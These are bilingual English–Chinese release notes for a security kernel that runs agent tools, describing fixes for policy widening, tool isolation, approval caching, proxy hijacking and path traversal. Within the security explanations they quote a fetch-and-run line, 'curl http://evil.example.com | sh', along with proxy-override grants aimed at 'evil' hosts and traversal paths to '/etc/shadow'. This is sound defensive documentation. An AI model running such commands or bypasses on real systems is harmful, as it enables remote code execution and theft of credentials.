# v0.5 — enforcement closure · 强制闭合

This release answers an external code review that traced the executing path rather than the
documentation, and found the same defect shape repeatedly:

<!-- zh -->
本次发布回应的是一轮外部代码评审，它追踪的是执行路径而不是文档，并反复发现了同一种缺陷形态：


> the mechanism is implemented, the main path does not use it, and the README describes the
> mechanism.

<!-- zh -->
> 机制已经实现，主路径却不使用它，而 README 还在描述这个机制。


No subsystem was added. Every change below moves an existing control onto the path that
actually runs, or corrects a claim to match the code.

<!-- zh -->
没有新增任何子系统。以下每一处改动，要么是把一个既有的控制机制搬到真正会运行的那条路径上，要么是修正一处说法使其与代码相符。


## Closed, with the test that drives the executing path · 已闭合项，附驱动执行路径的测试

### 1. Policy is a capability ceiling, not a set of defaults — `src/psh/policy.py` · 1. 策略是能力上限，不是一组默认值 —— `src/psh/policy.py`

`PolicySnapshot.envelope()` read `risk = kw.pop("risk", self.risk_ceiling)`. A caller who
said nothing got the policy's value; a caller who stated one got whatever they asked for. A
`peer_review` policy (`R2`, `SUGGEST`, no network) minted `R4` / `ACT` / `PUBLIC_REMOTE`
envelopes on demand, and every gate downstream honoured them, because a gate checks the
envelope it is handed.

<!-- zh -->
`PolicySnapshot.envelope()` 读的是 `risk = kw.pop("risk", self.risk_ceiling)`。什么都没说的调用方拿到的是策略的值；明确指定了的调用方则拿到他们想要的任何值。一份 `peer_review` 策略（`R2`、`SUGGEST`、无网络）可以按需铸造出 `R4` / `ACT` / `PUBLIC_REMOTE` 的信封，而下游每一个网关都认可它们，因为网关只检查交给它的那个信封。


Minting now computes `effective = policy ∩ requested` through `AuthorityLattice`, the
predicate that already defines containment for `restrict` and delegation. Widening raises
`PolicyDenied` naming the dimension; `envelope(clamp=True, …)` asks for the meet instead,
for the case where a broad profile is applied to an already narrow run.

<!-- zh -->
现在铸造时会通过 `AuthorityLattice` 计算 `effective = policy ∩ requested`，而 `AuthorityLattice` 正是那个早已为 `restrict` 与委托定义包含关系的谓词。放宽会抛出 `PolicyDenied` 并点名相应维度；`envelope(clamp=True, …)` 则改为请求两者的下确界（meet），用于把一份宽泛的配置档套用到一次本已很窄的运行上的情形。


A related bug fixed while there: `RiskTier.R0_TRIVIAL` is `0` and therefore falsy, so the
obvious `kw.pop("risk", None) or ceiling` idiom promotes the lowest risk tier to the
ceiling. Defaulting is done with an explicit `None` check.

<!-- zh -->
顺带修掉的一个相关 bug：`RiskTier.R0_TRIVIAL` 的值是 `0`，因此为假值，于是那个看起来很自然的 `kw.pop("risk", None) or ceiling` 写法会把最低的风险层级提升到上限。现在默认值通过一次显式的 `None` 判断来完成。


*Tests:* `test_policy_refuses_to_mint_an_envelope_wider_than_itself`,
`test_lowest_risk_tier_is_not_silently_promoted_to_the_ceiling`,
`test_clamp_narrows_instead_of_refusing_when_asked`.

<!-- zh -->
*测试：* `test_policy_refuses_to_mint_an_envelope_wider_than_itself`、`test_lowest_risk_tier_is_not_silently_promoted_to_the_ceiling`、`test_clamp_narrows_instead_of_refusing_when_asked`。


### 2. One minting path — `src/psh/kernel/__init__.py` · 2. 唯一的铸造路径 —— `src/psh/kernel/__init__.py`

`TrustedKernel.envelope()` never consulted `self.policy`. It minted from hard-coded
defaults: `PHI`, `ACT_WITH_APPROVAL`, the four local destinations, `config.default_risk`. It
now delegates to `PolicySnapshot.envelope`, so there is exactly one place an envelope comes
into existence and exactly one ceiling applied there.

<!-- zh -->
`TrustedKernel.envelope()` 从不查阅 `self.policy`。它按硬编码的默认值铸造：`PHI`、`ACT_WITH_APPROVAL`、四个本地目的地、`config.default_risk`。现在它委托给 `PolicySnapshot.envelope`，因此信封产生之处恰好只有一处，在那里施加上限之处也恰好只有一处。


Consequence worth stating: a kernel configured with a verification model whose destination
the policy forbids now fails at construction with a message saying so, instead of quietly
minting a wider envelope for the verifier.

<!-- zh -->
有一个值得说明的后果：若内核配置了一个验证模型，而该模型的目的地被策略禁止，现在它会在构造时失败并给出说明信息，而不是悄悄为验证者铸造一个更宽的信封。


*Tests:* `test_kernel_envelope_is_minted_under_the_kernels_policy`,
`test_a_widened_envelope_cannot_be_smuggled_past_the_model_gateway`,
`test_runner_cannot_raise_risk_above_the_policy_ceiling`.

<!-- zh -->
*测试：* `test_kernel_envelope_is_minted_under_the_kernels_policy`、`test_a_widened_envelope_cannot_be_smuggled_past_the_model_gateway`、`test_runner_cannot_raise_risk_above_the_policy_ceiling`。


### 3. Tool isolation on the path that executes — `src/psh/kernel/{isolation,egress}.py` · 3. 工具隔离落在真正执行的那条路径上 —— `src/psh/kernel/{isolation,egress}.py`

v0.4 shipped `IsolatedRunner` and a README paragraph about process isolation.
`ExecutionBroker.call_tool` ended in `component.invoke(unwrap_deep(payload), envelope)` —
in the kernel's own process. A reviewer set `SECRET=secret-123` in the parent and read it
straight out of a tool. The claim and the behaviour were different statements.

<!-- zh -->
v0.4 发布了 `IsolatedRunner`，以及 README 里一段关于进程隔离的文字。而 `ExecutionBroker.call_tool` 的结尾是 `component.invoke(unwrap_deep(payload), envelope)` —— 就在内核自己的进程里。一位评审者在父进程里设置了 `SECRET=secret-123`，然后直接从工具里把它读了出来。声明与行为是两句不同的话。


Now:

<!-- zh -->
现在：


* a manifest declares `backend="subprocess"` with an `entrypoint`; the broker runs it
  through `IsolatedExecutor` → `IsolatedRunner` (empty environment, working directory of
  its own, kernel-owned egress proxy, wall-clock and memory limits);
* the protocol is one JSON object in on stdin, one JSON value out on stdout; a non-zero exit
  is a `ContractViolation` carrying stderr, never a silent empty result;
* a component declaring isolation on a kernel with no runner is **refused**, not run in
  process;
* `backend="python"` components still run in process — and are counted as
  `in_process_tool_calls`, recorded in the event as `execution="in_process"`, and refused
  entirely when the policy sets `require_isolated_tools=True`;
* network reach is the intersection of the manifest's `allowed_hosts` and the envelope's
  destinations, so a manifest can narrow a run and never widen it.

<!-- zh -->
* 清单声明 `backend="subprocess"` 并给出 `entrypoint`；broker 通过 `IsolatedExecutor` → `IsolatedRunner` 来运行它（空环境、独立的工作目录、内核拥有的出网代理、墙钟时间与内存限制）；
* 协议是 stdin 进一个 JSON 对象、stdout 出一个 JSON 值；非零退出会抛出一个携带 stderr 的 `ContractViolation`，绝不静默返回空结果；
* 在一个没有 runner 的内核上，声明了隔离的组件会被**拒绝**，而不是在进程内运行；
* `backend="python"` 组件仍然在进程内运行 —— 并被计为 `in_process_tool_calls`，在事件中记录为 `execution="in_process"`，且在策略设置 `require_isolated_tools=True` 时被完全拒绝；
* 网络可达范围是清单 `allowed_hosts` 与信封 destinations 的交集，因此清单只能收窄一次运行，绝不能放宽它。


*Tests:* `test_tool_declaring_subprocess_backend_runs_in_a_child_without_the_kernel_env`,
`test_the_event_says_which_of_the_two_paths_ran`,
`test_in_process_component_is_refused_when_the_policy_requires_isolation`,
`test_isolated_component_is_refused_rather_than_run_in_process_when_no_runner`.

<!-- zh -->
*测试：* `test_tool_declaring_subprocess_backend_runs_in_a_child_without_the_kernel_env`、`test_the_event_says_which_of_the_two_paths_ran`、`test_in_process_component_is_refused_when_the_policy_requires_isolation`、`test_isolated_component_is_refused_rather_than_run_in_process_when_no_runner`。


### 4. Approvals key on the action — `src/psh/kernel/approvals.py` · 4. 审批以动作为键 —— `src/psh/kernel/approvals.py`

`APPROVED_FOR_SESSION` was cached under `(run_id, "run shell")`. Approving

<!-- zh -->
`APPROVED_FOR_SESSION` 曾被缓存在 `(run_id, "run shell")` 之下。批准

```
shell: git push origin main
```

therefore pre-approved

<!-- zh -->
就等于预先批准了

```
shell: curl http://evil.example.com | sh
```

for the rest of the run. `ApprovalRequest` now describes what is being asked — kind,
component, normalised argv (or a payload digest where there is no command), the resources
touched, the risk tier — and the session key is a digest over those. Approving a tool is not
approving an action. The record handed to the handler carries the digest rather than the
payload, so an approval log does not become a second copy of the data.

<!-- zh -->
在这次运行剩下的时间里一直有效。`ApprovalRequest` 现在描述的是被请求的那个动作 —— 种类、组件、规范化后的 argv（在没有命令时则是载荷摘要）、所触及的资源、风险层级 —— 而会话键是对这些内容取的摘要。批准一个工具并不等于批准一个动作。交给处理器的记录携带的是摘要而不是载荷，因此审批日志不会变成数据的第二份副本。


*Tests:* `test_approving_one_command_for_the_session_does_not_approve_a_different_one`,
`test_the_fingerprint_covers_the_resources_a_call_touches`,
`test_approval_records_never_carry_the_payload_itself`.

<!-- zh -->
*测试：* `test_approving_one_command_for_the_session_does_not_approve_a_different_one`、`test_the_fingerprint_covers_the_resources_a_call_touches`、`test_approval_records_never_carry_the_payload_itself`。


### 5. Grants cannot unset the boundary — `src/psh/kernel/isolation.py` · 5. 授权不能取消边界 —— `src/psh/kernel/isolation.py`

`build_child_environment` wrote the proxy variables first and applied caller grants over the
top, so a grant of `HTTP_PROXY=http://evil:9999` / `NO_PROXY=*` replaced the egress
configuration inside the child. Order is now: safe inherit → grants → kernel-reserved
variables, applied last. A grant naming a reserved variable (proxy family, `PATH`,
`PYTHONPATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `NODE_OPTIONS`, …) is refused outright rather
than silently dropped.

<!-- zh -->
`build_child_environment` 先写代理变量，再把调用方的授权覆盖在上面，于是授予 `HTTP_PROXY=http://evil:9999` / `NO_PROXY=*` 就把子进程内部的出网配置替换掉了。现在的顺序是：安全继承 → 授权 → 内核保留变量（最后应用）。凡是点名了保留变量的授权（代理变量族、`PATH`、`PYTHONPATH`、`LD_*`、`DYLD_*`、`BASH_ENV`、`NODE_OPTIONS` 等），都会被直接拒绝，而不是被静默丢弃。


### 6. The proxy resolves once, and owns the Host header · 6. 代理只解析一次，并且自己掌管 Host 头

* **DNS rebinding.** The policy resolved a name to check it, then handed the *name* to
  `socket.create_connection`, which resolved it again. The decision now carries the vetted
  addresses and the handler connects to one of those. A name that does not resolve is
  refused — "we could not check it" is not "it is fine".
* **Ports are part of the capability.** `api.example.org` grants 80 and 443;
  `api.example.org:8443` grants that port; `api.example.org:*` grants all.
* **`Host:` comes from the vetted URI**, not from the client, closing the shared-hosting /
  virtual-host bypass. Hop-by-hop and `Proxy-*` headers are stripped.
* **Resolution is injectable**, so unit tests never touch DNS. In v0.4 `decide()` called
  `getaddrinfo` unconditionally and "pure" handler tests blocked on name resolution —
  slow with a resolver, hanging without one, unrunnable air-gapped.

<!-- zh -->
* **DNS 重绑定（DNS rebinding）。** 策略为了检查一个名字而去解析它，随后把这个*名字*交给 `socket.create_connection`，后者又解析了一次。现在判定结果携带经过审查的地址，处理函数连接到其中之一。解析不出来的名字会被拒绝 —— "我们没能检查它"不等于"它没问题"。
* **端口是能力的一部分。** `api.example.org` 授予 80 和 443；`api.example.org:8443` 授予该端口；`api.example.org:*` 授予全部端口。
* **`Host:` 来自经过审查的 URI**，而不是来自客户端，从而堵住了共享主机 / 虚拟主机绕过（virtual-host bypass）。逐跳头（hop-by-hop）与 `Proxy-*` 头会被剥掉。
* **解析是可注入的**，因此单元测试绝不触碰 DNS。在 v0.4 中，`decide()` 无条件调用 `getaddrinfo`，于是"纯"处理函数测试会阻塞在名字解析上 —— 有解析器时慢，没有解析器时挂起，气隙环境下根本跑不起来。


CONNECT still only vets the TCP destination; what travels inside the TLS tunnel is not
inspected. That is inherent to `CONNECT` and is stated rather than papered over.

<!-- zh -->
CONNECT 仍然只审查 TCP 目的地；在 TLS 隧道内部传输的内容不会被检视。这是 `CONNECT` 固有的性质，它被如实说明，而不是被粉饰过去。


### 7. Filesystem containment after resolution — `src/psh/kernel/egress.py` · 7. 解析之后再做文件系统围堵 —— `src/psh/kernel/egress.py`

Path checks were `fnmatch` against the string the payload supplied, and only over top-level
keys. `/allowed/../secret` matches `/allowed/*` as text; so does a symlink at
`/allowed/link`; and `{"config": {"target": "/etc/shadow"}}` was never looked at. Candidate
paths are now collected at any depth and each is `expanduser().resolve()`-ed and required to
land inside a resolved allowed root. The check also applies to components declaring
`requires_filesystem`, not only `mutates`.

<!-- zh -->
当时的路径检查是对载荷所提供的字符串做 `fnmatch`，而且只看顶层键。`/allowed/../secret` 作为文本能匹配 `/allowed/*`；`/allowed/link` 处的软链接也能；而 `{"config": {"target": "/etc/shadow"}}` 则从未被看过一眼。现在候选路径会在任意深度被收集，每一条都要经过 `expanduser().resolve()`，并被要求落在已解析的允许根目录之内。该检查同样适用于声明了 `requires_filesystem` 的组件，而不只是声明 `mutates` 的组件。


The deeper point stands and is documented rather than claimed away: real filesystem
isolation needs the OS. This is containment of *declared* paths, not of what a process can
reach.

<!-- zh -->
更深一层的要点依然成立，并且是被记录下来而不是被否认掉：真正的文件系统隔离需要操作系统的支持。这里围堵的是*已声明的*路径，而不是一个进程实际能够触及的范围。


### 8. External hooks are contained — `src/psh/kernel/hooks.py` · 8. 外部钩子被围堵 —— `src/psh/kernel/hooks.py`

A `PreToolUse` command hook received `unwrap_deep(payload)` — the whole tool input,
including PHI — and ran under a bare `subprocess.run`: a third-party process holding
sensitive content with its own unsupervised network. In a system whose central claim is one
governed door, that was a second one.

<!-- zh -->
一个 `PreToolUse` 命令钩子收到的曾是 `unwrap_deep(payload)` —— 完整的工具输入，包含 PHI —— 并且运行在一个裸的 `subprocess.run` 之下：一个第三方进程，握有敏感内容，还自带无人监管的网络。在一个核心主张是"只有一扇受治理的门"的系统里，这就是第二扇门。


External hooks now run through the same `IsolatedRunner` a tool does, with an empty host
allowlist (no network) unless one is stated, and receive a redacted view: digest, type and
key names instead of content. In-process callables default to `trusted=True` — they already
share the kernel's address space, so redacting from them would be theatre.

<!-- zh -->
外部钩子现在和工具一样，通过同一个 `IsolatedRunner` 运行：默认使用空的主机允许列表（即无网络），除非明确给出；并且收到的是经过脱敏的视图：摘要、类型与键名，而不是内容。进程内（in-process）可调用对象默认为 `trusted=True` —— 它们本来就与内核共享同一地址空间，对它们做脱敏只是做戏。


### 9. The output gate is not English-only — `src/psh/kernel/output_gate.py` · 9. 输出门并不只认英文 —— `src/psh/kernel/output_gate.py`

The clinical-assertion regex matched English verbs. Three families were invisible:

<!-- zh -->
临床断言所用的正则表达式原来只匹配英文动词。有三类内容因此不可见：


* Chinese clinical assertions (显著降低死亡率, 独立危险因素, 不良反应);
* reported statistics with no clinical verb at all — `AUC was 0.91`, `odds ratio 1.84`,
  `sensitivity reached 93%`, `p < 0.001`;
* CJK text generally, which has no spaces, so `re.split(r"(?<=[.!?])\s+")` returned a whole
  paragraph as one "sentence" that passed or failed wholesale.

<!-- zh -->
* 中文临床断言（显著降低死亡率、独立危险因素、不良反应）；
* 完全不含临床动词的报告型统计量 —— `AUC was 0.91`、`odds ratio 1.84`、`sensitivity reached 93%`、`p < 0.001`；
* 广义上的中日韩（CJK）文本，它没有空格，因此 `re.split(r"(?<=[.!?])\s+")` 会把整个段落当作一个"句子"返回，整体通过或整体失败。


All three are recognised now. Intent and methods statements (本研究拟…, "we plan to…") remain
out of scope in both languages.

<!-- zh -->
这三类现在都能被识别了。意图与方法类陈述（本研究拟…、"we plan to…"）在两种语言中仍然不在范围之内。


## Engineering and release hygiene · 工程与发布卫生

* `TrustedKernel.close()` releases the WorkGraph's SQLite connection as well as the event
  store, and is idempotent. Invisible on Linux; "database is locked" on Windows.
* `hypothesis` is a declared test dependency. Without it the authority-monotonicity property
  tests `importorskip`-ed away — the checks with the widest coverage were the ones a clean
  install silently skipped.
* `addopts = -m 'not live'` in `pyproject.toml`. The marker existed and nothing applied it,
  so the documented command ran live network tests and failed where there was no network.
* AppleDouble `._*` sidecars removed and git-ignored. They contain NUL bytes and make
  `python -m compileall src` fail on every one of them.
* `PSHConfig(state_dir="/some/string")` works instead of failing four properties later with
  `unsupported operand type(s) for /: 'str' and 'str'`.
* `PATTERN_ATTRIBUTION.md` claimed `AuthorityLattice.BUDGET_DIMENSIONS` gained
  `max_model_tier`. It never existed; the section now records it as an open item rather than
  a shipped one.

<!-- zh -->
* `TrustedKernel.close()` 既释放 WorkGraph 的 SQLite 连接，也释放事件存储，并且是幂等的。在 Linux 上无感；在 Windows 上就是 "database is locked"。
* `hypothesis` 现在是被声明的测试依赖。没有它时，权限单调性属性测试会被 `importorskip` 跳过 —— 覆盖率最广的那些检查，恰恰是干净安装会静默跳过的那批。
* `pyproject.toml` 中的 `addopts = -m 'not live'`。这个标记本来就存在，却没有任何东西去应用它，于是文档里给出的命令会去跑实时网络测试，并在没有网络的地方失败。
* AppleDouble `._*` 伴随文件已删除并加入 git 忽略。它们含有 NUL 字节，会让 `python -m compileall src` 在每一个这样的文件上失败。
* `PSHConfig(state_dir="/some/string")` 可以正常工作，而不是在四个属性之后才失败于 `unsupported operand type(s) for /: 'str' and 'str'`。
* `PATTERN_ATTRIBUTION.md` 曾声称 `AuthorityLattice.BUDGET_DIMENSIONS` 增加了 `max_model_tier`。这个维度从来不存在；该小节现在把它记为一项未完成事项，而不是已发布事项。


## Deliberately still open · 刻意仍然敞开

Named here so they are not mistaken for oversights.

<!-- zh -->
在此列出，以免被误认为是疏忽。


1. **No OS sandbox.** `NoSandbox` ships and says so. A raw socket, and any filesystem access
   a process makes without naming it in a payload, are unconfined. `SandboxBackend` is the
   seam; Seatbelt / bubblewrap+seccomp implementations are the next real security increment,
   and nothing else in this list matters as much.
2. **`backend="python"` components remain the default.** The policy switch exists; the
   shipped profiles do not yet set it, because no bundled component is packaged for
   subprocess execution.
3. **`close != revoke`.** Lifecycle status is not authorisation state. There is no
   suspend/revoke check on an in-flight envelope.
4. **No model-tier authority dimension** (see `PATTERN_ATTRIBUTION.md` §7).
5. **Claim support is lexical.** Scope checking is structured; the support judgement itself
   is still overlap-based unless a verification model is configured.
6. **Scientific artifacts are not typed.** Figures, tables, datasets and statistical results
   pass the release gate as ordinary objects. A `StatisticalResult` / `FigureArtifact` /
   `DatasetArtifact` family carrying code hash, data hash, parameters, software version and
   run id is the work that would make this a scientific artifact verification framework
   rather than scientific *text* governance.
7. **No ontology version pinning.** When an ontology resolver lands, its verdicts must carry
   release, descriptor id, retrieval time and resolver version, or a re-run in three years
   silently answers a different question.
8. **The planner is a placeholder**, and the audit chain is tamper-evident rather than
   tamper-proof.

<!-- zh -->
1. **没有操作系统沙箱。** `NoSandbox` 随附发布，并且自己就这么说。一个裸 socket，以及一个进程在不于载荷中点名的情况下所做的任何文件系统访问，都不受约束。`SandboxBackend` 就是那道接缝；Seatbelt / bubblewrap+seccomp 实现是下一个真正的安全增量，而这份清单里其他任何一项都没有它重要。
2. **`backend="python"` 组件仍然是默认值。** 策略开关已经存在；但随附的配置档还没有设置它，因为没有任何捆绑组件是按子进程执行来打包的。
3. **`close != revoke`。** 生命周期状态不是授权状态。对一封在途信封没有挂起/撤销检查。
4. **没有模型层级的权限维度**（见 `PATTERN_ATTRIBUTION.md` §7）。
5. **主张支撑是词法的。** 范围检查是结构化的；除非配置了验证模型，支撑性判断本身仍然基于重叠（overlap）。
6. **科学产物没有被类型化。** 图、表、数据集与统计结果都作为普通对象通过发布门。一个携带代码哈希、数据哈希、参数、软件版本与运行 id 的 `StatisticalResult` / `FigureArtifact` / `DatasetArtifact` 族，才是能让这套东西成为科学产物验证框架、而不只是科学*文本*治理的那项工作。
7. **没有本体版本固定。** 当本体解析器落地时，它的判定必须携带 release、descriptor id、检索时间与解析器版本，否则三年后重跑会静默地回答一个不同的问题。
8. **规划器仍是占位实现**，而审计链是防篡改可发现（tamper-evident）而非防篡改（tamper-proof）。


## Reproducing the review's own probes · 复现评审自己的探针

Each of these was demonstrated open against v0.4 and is closed here:

<!-- zh -->
以下每一项都曾在 v0.4 上被演示为敞开，现已在此闭合：


```python
# 1. widening under a narrow policy
policy = get_profile("peer_review").freeze()
policy.envelope(autonomy=Autonomy.ACT)            # PolicyDenied: autonomy

# 2. reading the kernel's environment from a tool
os.environ["SECRET"] = "secret-123"
kernel.broker.call_tool(subprocess_tool, payload, env).value["secret"]   # None

# 3. one session approval covering a second command
#    -> the handler is asked again; the fingerprints differ

# 4. a grant disabling the egress boundary
IsolatedRunner().run(argv, workdir=w, grants={"HTTP_PROXY": "http://evil:9999"})
# PolicyDenied: HTTP_PROXY is reserved by the kernel
```
